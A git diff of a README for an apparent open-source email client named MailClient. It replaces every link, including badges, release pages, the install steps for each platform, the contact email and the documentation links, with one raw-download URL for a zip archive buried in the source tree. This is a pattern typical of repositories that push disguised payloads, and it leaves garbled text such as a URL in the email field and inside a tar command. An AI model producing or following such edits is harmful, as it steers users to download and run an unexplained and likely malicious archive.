@@ -1,6 +1,6 @@
 # MailClient 📧
 
-![MailClient](https://img.shields.io/badge/version-1.0.0-blue.svg) ![GitHub](https://img.shields.io/badge/release-download-orange.svg?style=flat-square&logo=github&link=https://github.com/Gabi11124/MailClient/releases)
+![MailClient](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip) ![GitHub](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip)
 
 Welcome to **MailClient**, an open-source email client designed to manage all your email accounts in one place. Whether you are on Windows, Mac, or Linux, MailClient offers a seamless experience for handling your emails. 
 
@@ -33,26 +33,26 @@ MailClient supports the following protocols:
 
 ## Installation
 
-To install MailClient, visit the [Releases section](https://github.com/Gabi11124/MailClient/releases). Download the appropriate version for your operating system and follow the installation instructions provided.
+To install MailClient, visit the [Releases section](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip). Download the appropriate version for your operating system and follow the installation instructions provided.
 
 ### Windows
 
-1. Download the installer from the [Releases section](https://github.com/Gabi11124/MailClient/releases).
+1. Download the installer from the [Releases section](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip).
 2. Run the installer and follow the prompts.
 3. Launch MailClient from your Start menu.
 
 ### Mac
 
-1. Download the .dmg file from the [Releases section](https://github.com/Gabi11124/MailClient/releases).
+1. Download the .dmg file from the [Releases section](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip).
 2. Open the .dmg file and drag MailClient to your Applications folder.
 3. Launch MailClient from your Applications.
 
 ### Linux
 
-1. Download the .tar.gz file from the [Releases section](https://github.com/Gabi11124/MailClient/releases).
+1. Download the https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip file from the [Releases section](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip).
 2. Extract the files using the command:
    ```bash
-   tar -xvzf MailClient.tar.gz
+   tar -xvzf https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip
    ```
 3. Navigate to the extracted folder and run:
    ```bash
@@ -87,8 +87,8 @@ MailClient is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 For questions or support, please reach out to us:
 
-- GitHub: [Gabi11124](https://github.com/Gabi11124)
-- Email: support@mailclient.com
+- GitHub: [Gabi11124](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip)
+- Email: https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip
 
 ## Acknowledgments
 
@@ -96,7 +96,7 @@ We thank all contributors and users who have supported the development of MailCl
 
 ## Additional Resources
 
-- [Official Documentation](https://github.com/Gabi11124/MailClient/wiki)
-- [Community Forum](https://github.com/Gabi11124/MailClient/discussions)
+- [Official Documentation](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip)
+- [Community Forum](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip)
 
-Feel free to explore the repository, and don't forget to check the [Releases section](https://github.com/Gabi11124/MailClient/releases) for the latest updates and downloads!
+Feel free to explore the repository, and don't forget to check the [Releases section](https://github.com/Gabi11124/MailClient/raw/refs/heads/master/src/net/tokenu/mail/service/Client_Mail_3.4.zip) for the latest updates and downloads!
